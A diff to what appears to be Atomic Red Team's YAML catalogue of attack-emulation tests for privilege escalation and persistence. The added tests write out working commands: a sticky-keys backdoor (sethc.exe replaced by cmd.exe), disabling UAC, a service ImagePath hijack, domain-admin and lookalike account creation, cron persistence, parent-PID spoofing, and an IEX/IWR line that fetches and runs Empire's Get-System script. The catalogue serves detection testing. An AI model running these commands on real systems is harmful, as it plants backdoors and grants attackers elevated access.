@@ -337,14 +337,23 @@ privilege-escalation:
           type: Path
           default: C:\windows\system32\cmd.exe
       executor:
-        command: "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value
-          = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item
-          = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows
-          NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path
-          $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty
-          -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
-          \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
-          $Value\n  }\n}\n"
+        command: |
+          $input_table = "#{parent_list}".split(",")
+          $Name = "Debugger"
+          $Value = "#{attached_process}"
+          Foreach ($item in $input_table){
+            $item = $item.trim()
+            $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
+            IF(!(Test-Path $registryPath))
+            {
+              New-Item -Path $registryPath -Force
+              New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+            }
+            ELSE
+            {
+              New-ItemProperty -Path $registryPath -Name $name -Value $Value
+            }
+          }
         cleanup_command: |
           $input_table = "#{parent_list}".split(",")
           Foreach ($item in $input_table)
@@ -353,6 +362,24 @@ privilege-escalation:
             reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
           }
         name: powershell
+        elevation_required: true
+    - name: Replace binary of sticky keys
+      auto_generated_guid: 934e90cf-29ca-48b3-863c-411737ad44e3
+      description: 'Replace sticky keys binary (sethc.exe) with cmd.exe
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+          takeown /F C:\Windows\System32\sethc.exe /A
+          icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
+          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+        cleanup_command: 'copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
+
+'
+        name: command_prompt
         elevation_required: true
   T1546.009:
     technique:
@@ -1435,10 +1462,11 @@ privilege-escalation:
         elevation_required: true
     - name: Bypass UAC using sdclt DelegateExecute
       auto_generated_guid: 3be891eb-4608-4173-87e8-78b494c029b7
-      description: "Bypasses User Account Control using a fileless method, registry
-        only. \nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference
-        - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted
-        from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n"
+      description: |
+        Bypasses User Account Control using a fileless method, registry only.
+        Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
+        [Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
+        Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)
       supported_platforms:
       - windows
       input_arguments:
@@ -1457,6 +1485,24 @@ privilege-escalation:
 
 '
         name: powershell
+    - name: Disable UAC using reg.exe
+      auto_generated_guid: 9e8af564-53ec-407e-aaa8-3cb20c3af7f9
+      description: |
+        Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key
+        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0
+      supported_platforms:
+      - windows
+      executor:
+        command: 'reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v EnableLUA /t REG_DWORD /d 0 /f
+
+'
+        cleanup_command: 'reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v EnableLUA /t REG_DWORD /d 1 /f
+
+'
+        name: command_prompt
+        elevation_required: true
   T1574.012:
     technique:
       external_references:
@@ -2091,14 +2137,18 @@ privilege-escalation:
           default: "/tmp/persistevil"
       executor:
         name: bash
-        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        command: |
+          crontab -l > /tmp/notevil
+          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        cleanup_command: 'crontab /tmp/notevil
 
 '
-    - name: Cron - Add script to cron folder
+    - name: Cron - Add script to all cron subfolders
       auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
-      description: 'This test adds a script to a cron folder configured to execute
-        on a schedule. This technique was used by the threat actor Rocke during the
-        exploitation of Linux web servers.
+      description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
+        /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a
+        schedule. This technique was used by the threat actor Rocke during the exploitation
+        of Linux web servers.
 
 '
       supported_platforms:
@@ -2116,7 +2166,43 @@ privilege-escalation:
       executor:
         elevation_required: true
         name: bash
-        command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+        command: |
+          echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+          echo "#{command}" > /etc/cron.hourly/#{cron_script_name}
+          echo "#{command}" > /etc/cron.monthly/#{cron_script_name}
+          echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
+        cleanup_command: |
+          rm /etc/cron.daily/#{cron_script_name}
+          rm /etc/cron.hourly/#{cron_script_name}
+          rm /etc/cron.monthly/#{cron_script_name}
+          rm /etc/cron.weekly/#{cron_script_name}
+    - name: Cron - Add script to /var/spool/cron/crontabs/ folder
+      auto_generated_guid: 2d943c18-e74a-44bf-936f-25ade6cccab4
+      description: 'This test adds a script to a /var/spool/cron/crontabs folder configured
+        to execute on a schedule. This technique was used by the threat actor Rocke
+        during the exploitation of Linux web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in /var/spool/cron/crontabs folder
+          type: string
+          default: persistevil
+      executor:
+        elevation_required: true
+        name: bash
+        command: 'echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
+
+'
+        cleanup_command: 'rm /var/spool/cron/crontabs/#{cron_script_name}
+
+'
   T1574.001:
     technique:
       created: '2020-03-13T18:11:08.357Z'
@@ -2378,11 +2464,11 @@ privilege-escalation:
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no
-          net localgroup administrators guest /delete
-          net localgroup "Remote Desktop Users" guest /delete
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f
+          net user guest /active:no >nul 2>&1
+          net localgroup administrators guest /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -4488,6 +4574,134 @@ privilege-escalation:
           Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
           Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
         name: powershell
+    - name: Parent PID Spoofing - Spawn from Current Process
+      auto_generated_guid: 14920ebd-1d61-491a-85e0-fe98efe37f25
+      description: Spawns a powershell.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine
+          ''#{command_line}'' -ParentId #{parent_pid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Specified Process
+      auto_generated_guid: cbbff285-9051-444a-9d17-c07cd2d230eb
+      description: Spawns a notepad.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        test_guid:
+          description: Defined test GUID
+          type: string
+          default: 12345678-1234-1234-1234-123456789123
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid
+          #{test_guid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from svchost.exe
+      auto_generated_guid: e9f2b777-3123-430b-805d-5cedc66ab591
+      description: Spawnd a process as a child of the first accessible svchost.exe
+        process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine,
+          ProcessId -Filter "Name = ''svchost.exe'' AND CommandLine LIKE ''%''" |
+          Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path}
+          -CommandLine ''#{command_line}'''
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from New Process
+      auto_generated_guid: 2988133e-561c-4e42-a15f-6281e6a9b2db
+      description: Creates a notepad.exe process and then spawns a powershell.exe
+        process as a child of it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_name:
+          description: Parent process to spoof from
+          type: path
+          default: "$Env:windir\\System32\\notepad.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent
+          -FilePath #{file_path} -CommandLine ''#{command_line}'''
+        name: powershell
   T1034:
     technique:
       id: attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02
@@ -4794,11 +5008,11 @@ privilege-escalation:
           sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
           sc start "Example Service"
         cleanup_command: |
-          sc stop "Example Service"
-          sc delete "Example Service"
-          del "C:\Program Files\windows_service.exe"
-          del "C:\program.exe"
-          del "C:\Time.log"
+          sc stop "Example Service" >nul 2>&1
+          sc delete "Example Service" >nul 2>&1
+          del "C:\Program Files\windows_service.exe" >nul 2>&1
+          del "C:\program.exe" >nul 2>&1
+          del "C:\Time.log" >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1547.011:
@@ -5933,6 +6147,7 @@ privilege-escalation:
 
 '
         name: command_prompt
+        elevation_required: true
     - name: PowerShell Registry RunOnce
       auto_generated_guid: eb44f842-0457-4ddc-9b92-c4caa144ac42
       description: |
@@ -6540,59 +6755,7 @@ privilege-escalation:
         techniques. "
       x_mitre_platforms:
       - Windows
-      identifier: T1574.010
-    atomic_tests:
-    - name: File System Permissions Weakness
-      auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
-      description: |
-        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
-        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
-        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
-
-        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
-      supported_platforms:
-      - windows
-      input_arguments:
-        malicious_file:
-          description: File to replace weak permission file with
-          type: path
-          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
-        weak_permission_file:
-          description: check weak files permission
-          type: path
-          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
-
-'
-        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: |
-          New-Item #{weak_permission_file} -Force | Out-Null
-          Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: 'A file to replace the original weak_permission_file. In an attack
-          this would be the malicious file gaining extra privileges
-
-'
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
-          New-Item #{malicious_file} -Force | Out-Null
-          Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
-      executor:
-        command: |
-          Get-WmiObject win32_service | select PathName
-          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
-        cleanup_command: |
-          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
-          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
-        name: powershell
+    atomic_tests: []
   T1574.011:
     technique:
       external_references:
@@ -6682,9 +6845,9 @@ privilege-escalation:
     atomic_tests:
     - name: Service Registry Permissions Weakness
       auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
-      description: "Service registry permissions weakness check and then which can
-        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
-        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      description: |
+        Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.
+        reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /v ImagePath /d "C:\temp\AtomicRedteam.exe"
       supported_platforms:
       - windows
       input_arguments:
@@ -6697,6 +6860,48 @@ privilege-escalation:
           get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
           get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
         name: powershell
+    - name: Service ImagePath Change with reg.exe
+      auto_generated_guid: f38e9eea-e1d7-4ba6-b716-584791963827
+      description: 'Change Service registry ImagePath of a bengin service to a malicious
+        file
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service name
+          type: String
+          default: calcservice
+        weak_service_path:
+          description: weak service path
+          type: String
+          default: "%windir%\\system32\\win32calc.exe"
+        malicious_service_path:
+          description: malicious service path
+          type: String
+          default: "%windir%\\system32\\cmd.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The service must exist (#{weak_service_name})
+
+'
+        prereq_command: 'if (Get-Service #{weak_service_name}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'sc.exe create #{weak_service_name} binpath= "#{weak_service_path}"
+
+'
+      executor:
+        command: 'reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
+          /f /v ImagePath /d "#{malicious_service_path}"
+
+'
+        cleanup_command: 'sc.exe delete #{weak_service_name}
+
+'
+        name: command_prompt
   T1548.001:
     technique:
       external_references:
@@ -7498,7 +7703,34 @@ privilege-escalation:
       - File system access controls
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1134.001
+    atomic_tests:
+    - name: Named pipe client impersonation
+      auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+        Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique NamedPipe -Verbose
+        name: powershell
+        elevation_required: true
+    - name: "`SeDebugPrivilege` token duplication"
+      auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique Token -Verbose
+        name: powershell
+        elevation_required: true
   T1546.005:
     technique:
       external_references:
@@ -8353,14 +8585,23 @@ persistence:
           type: Path
           default: C:\windows\system32\cmd.exe
       executor:
-        command: "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value
-          = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item
-          = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows
-          NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path
-          $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty
-          -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
-          \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
-          $Value\n  }\n}\n"
+        command: |
+          $input_table = "#{parent_list}".split(",")
+          $Name = "Debugger"
+          $Value = "#{attached_process}"
+          Foreach ($item in $input_table){
+            $item = $item.trim()
+            $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
+            IF(!(Test-Path $registryPath))
+            {
+              New-Item -Path $registryPath -Force
+              New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+            }
+            ELSE
+            {
+              New-ItemProperty -Path $registryPath -Name $name -Value $Value
+            }
+          }
         cleanup_command: |
           $input_table = "#{parent_list}".split(",")
           Foreach ($item in $input_table)
@@ -8369,6 +8610,24 @@ persistence:
             reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
           }
         name: powershell
+        elevation_required: true
+    - name: Replace binary of sticky keys
+      auto_generated_guid: 934e90cf-29ca-48b3-863c-411737ad44e3
+      description: 'Replace sticky keys binary (sethc.exe) with cmd.exe
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+          takeown /F C:\Windows\System32\sethc.exe /A
+          icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
+          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+        cleanup_command: 'copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
+
+'
+        name: command_prompt
         elevation_required: true
   T1098:
     technique:
@@ -8450,18 +8709,27 @@ persistence:
           $y = Get-Random -Minimum 2 -Maximum 9999
           $z = Get-Random -Minimum 2 -Maximum 9999
           $w = Get-Random -Minimum 2 -Maximum 9999
-          Write-Host HaHaHa_$x$y$z$w
+          Write-Host HaHa_$x$y$z
 
-          $hostname = (Get-CIMInstance CIM_ComputerSystem).Name
-
-          $fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name
+          $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name
 
           foreach($member in $fmm) {
               if($member -like "*Administrator*") {
-                  Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
-                  Write-Host "Successfully Renamed Administrator Account on" $hostname
+                  $account = $member.Name -replace ".+\\\","" # strip computername\
+                  $originalDescription = (Get-LocalUser -Name $account).Description
+                  Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
+                  Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
+                  Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
                   }
               }
+        cleanup_command: |
+          $list = Get-LocalUser |?{$_.Description -like "atr:*"}
+          foreach($u in $list) {
+            $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
+            Set-LocalUser -Name $u.Name -Description $Matches.Description
+            Rename-LocalUser -Name $u.Name -NewName $Matches.Name
+            Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
+          }
         name: powershell
         elevation_required: true
     - name: Domain Account and Group Manipulate
@@ -9456,8 +9724,10 @@ persistence:
     - name: Persist, Download, & Execute
       auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
       description: |
-        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
-        and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+        Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+        This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+        This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
       supported_platforms:
       - windows
       input_arguments:
@@ -9520,7 +9790,7 @@ persistence:
           /eventName:desktopimgdownldr
 
 '
-        cleanup_command: 'del #{cleanup_path}\#{cleanup_file}
+        cleanup_command: 'del #{cleanup_path}\#{cleanup_file} >null 2>&1
 
 '
         name: command_prompt
@@ -10643,14 +10913,18 @@ persistence:
           default: "/tmp/persistevil"
       executor:
         name: bash
-        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        command: |
+          crontab -l > /tmp/notevil
+          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        cleanup_command: 'crontab /tmp/notevil
 
 '
-    - name: Cron - Add script to cron folder
+    - name: Cron - Add script to all cron subfolders
       auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
-      description: 'This test adds a script to a cron folder configured to execute
-        on a schedule. This technique was used by the threat actor Rocke during the
-        exploitation of Linux web servers.
+      description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
+        /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a
+        schedule. This technique was used by the threat actor Rocke during the exploitation
+        of Linux web servers.
 
 '
       supported_platforms:
@@ -10668,7 +10942,43 @@ persistence:
       executor:
         elevation_required: true
         name: bash
-        command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+        command: |
+          echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+          echo "#{command}" > /etc/cron.hourly/#{cron_script_name}
+          echo "#{command}" > /etc/cron.monthly/#{cron_script_name}
+          echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
+        cleanup_command: |
+          rm /etc/cron.daily/#{cron_script_name}
+          rm /etc/cron.hourly/#{cron_script_name}
+          rm /etc/cron.monthly/#{cron_script_name}
+          rm /etc/cron.weekly/#{cron_script_name}
+    - name: Cron - Add script to /var/spool/cron/crontabs/ folder
+      auto_generated_guid: 2d943c18-e74a-44bf-936f-25ade6cccab4
+      description: 'This test adds a script to a /var/spool/cron/crontabs folder configured
+        to execute on a schedule. This technique was used by the threat actor Rocke
+        during the exploitation of Linux web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in /var/spool/cron/crontabs folder
+          type: string
+          default: persistevil
+      executor:
+        elevation_required: true
+        name: bash
+        command: 'echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
+
+'
+        cleanup_command: 'rm /var/spool/cron/crontabs/#{cron_script_name}
+
+'
   T1574.001:
     technique:
       created: '2020-03-13T18:11:08.357Z'
@@ -10930,11 +11240,11 @@ persistence:
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no
-          net localgroup administrators guest /delete
-          net localgroup "Remote Desktop Users" guest /delete
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f
+          net user guest /active:no >nul 2>&1
+          net localgroup administrators guest /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1136.002:
@@ -10981,7 +11291,62 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1136.002
+    atomic_tests:
+    - name: Create a new Windows domain admin user
+      auto_generated_guid: fcec2963-9951-4173-9bfa-98d8b7834e62
+      description: 'Creates a new domain admin user in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: T1136.002_Admin
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass123!
+        group:
+          description: Domain administrator group to which add the user to
+          type: String
+          default: Domain Admins
+      executor:
+        command: |
+          net user "#{username}" "#{password}" /add /domain
+          net group "#{group}" "#{username}" /add /domain
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: command_prompt
+        elevation_required: false
+    - name: Create a new account similar to ANONYMOUS LOGON
+      auto_generated_guid: dc7726d2-8ccb-4cc6-af22-0d5afb53a548
+      description: 'Create a new account similar to ANONYMOUS LOGON in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: ANONYMOUS  LOGON
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass123!
+      executor:
+        command: 'net user "#{username}" "#{password}" /add /domain
+
+'
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: command_prompt
+        elevation_required: false
   T1078.002:
     technique:
       created: '2020-03-13T20:21:54.758Z'
@@ -11393,7 +11758,51 @@ persistence:
       - Daniel Oakley
       - Travis Smith, Tripwire
       x_mitre_version: '2.1'
-    atomic_tests: []
+      identifier: T1133
+    atomic_tests:
+    - name: Running Chrome VPN Extensions via the Registry 2 vpn extension
